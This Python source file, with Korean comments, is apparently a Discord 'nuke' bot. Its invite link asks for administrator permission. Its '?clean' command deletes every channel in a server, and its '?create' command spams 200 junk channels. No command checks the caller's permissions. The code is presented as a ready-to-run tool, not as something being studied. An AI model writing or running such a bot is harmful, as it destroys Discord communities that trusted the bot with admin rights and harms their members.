#머리

import discord, asyncio
from discord.ext import commands
import os

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="튀엣"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command()
async def clean(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
        
@client.command()
async def invite(ctx):
    await ctx.send("튀엣 \n https://discord.com/api/oauth2/authorize?client_id=819929289759653928&permissions=8&scope=bot")

@client.command()
async def create(ctx):
     for i in range(200):
        await ctx.guild.create_text_channel("튀엣")
        
@client.command()
async def cmd(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmd = discord.Embed(
    title = "튀엣한 커맨드", 
    description = """
**__COMMANDS__**
```
?cmd
튀엣 
 
?clean
튀엣 제거 
 
?create
튀엣 생성

?invite
튀엣 초대
```
**-------------**
```
오류 
```
""")
  await author.send(embed = cmd)
client.run(os.environ['token'])
